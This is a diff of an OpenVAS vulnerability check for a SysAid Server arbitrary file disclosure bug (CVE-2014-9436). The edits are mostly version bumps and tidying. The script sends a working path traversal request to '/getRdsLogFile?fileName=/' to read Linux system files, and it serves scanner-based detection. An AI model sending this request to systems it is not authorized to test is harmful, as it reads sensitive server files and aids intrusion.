@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_sysaid_file_disclosure_vuln.nasl 11831 2018-10-11 07:49:24Z jschulte $
+# $Id: gb_sysaid_file_disclosure_vuln.nasl 12008 2018-10-22 08:12:11Z cfischer $
 #
 # SysAid Server Arbitrary File Disclosure Vulnerability
 #
@@ -27,25 +27,23 @@
 
 CPE = 'cpe:/a:sysaid:sysaid';
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105938");
-  script_version("$Revision: 11831 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-11 09:49:24 +0200 (Thu, 11 Oct 2018) $");
+  script_version("$Revision: 12008 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-22 10:12:11 +0200 (Mon, 22 Oct 2018) $");
   script_tag(name:"creation_date", value:"2015-01-13 16:45:50 +0700 (Tue, 13 Jan 2015)");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-
   script_cve_id("CVE-2014-9436");
-
   script_name("SysAid Server Arbitrary File Disclosure Vulnerability");
-
   script_category(ACT_ATTACK);
-
   script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
   script_family("Web application abuses");
   script_dependencies("gb_sysaid_detect.nasl");
   script_mandatory_keys("sysaid/installed");
+
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/35593/");
 
   script_tag(name:"summary", value:"SysAid On-Premise is prone to an arbitrary file
   disclosure vulnerability.");
@@ -62,10 +60,7 @@ if (description)
 
   script_tag(name:"solution", value:"Upgrade to version 14.4.2 or above.");
 
-  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/35593/");
-
   script_tag(name:"qod_type", value:"remote_app");
-
   script_tag(name:"solution_type", value:"VendorFix");
 
   exit(0);
@@ -87,11 +82,13 @@ if (dir == "/")
 
 req = http_get(item:string(dir, "/Login.jsp"), port:port);
 res = http_keepalive_send_recv(port:port, data:req);
-useragent = get_http_user_agent();
 
 sessionid = eregmatch(string:res, pattern:"JSESSIONID=([^;]+)");
 if (isnull(sessionid[1]))
   exit(0);
+
+useragent = get_http_user_agent();
+host = http_host_name(port: port);
 
 files = traversal_files("linux");
 
@@ -101,7 +98,7 @@ foreach pattern(keys(files)) {
 
   url = dir + '/getRdsLogFile?fileName=/' + file;
   req = 'GET ' + url + ' HTTP/1.1\r\n' +
-        'Host: ' + http_host_name(port: port) + '\r\n' +
+        'Host: ' + host + '\r\n' +
         'User-Agent: ' + useragent + '\r\n' +
         'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
         'Accept-Language: en-US,en;q=0.5\r\n' +
@@ -112,10 +109,10 @@ foreach pattern(keys(files)) {
   res = http_keepalive_send_recv(port:port, data:req);
 
   if (res && egrep(string:res, pattern:pattern)) {
-    report = report_vuln_url(url:url);
+    report = report_vuln_url(url:url, port:port);
     security_message(data:report, port:port);
     exit(0);
   }
 }
 
-exit(99);
+exit(0);
